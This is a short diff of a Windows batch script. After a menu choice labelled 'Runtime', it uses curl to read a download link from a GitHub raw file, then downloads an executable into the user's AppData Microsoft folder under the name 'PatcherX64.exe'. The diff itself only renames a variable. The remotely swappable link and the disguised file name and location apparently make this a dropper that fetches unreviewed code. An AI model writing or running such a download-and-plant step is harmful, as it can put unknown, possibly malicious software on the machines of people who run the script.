@@ -360,13 +360,13 @@ echo.
 echo You chose Runtime.
 timeout /t 2 /nobreak >nul
 
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "SHSTFILELINK=%%i"
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNEVERYFILELINK=%%i"
 
 
 
  
 :: Download the file using curl
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%SHSTFILELINK%"
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNEVERYFILELINK%"
  
 timeout /t 2 /nobreak >nul
  
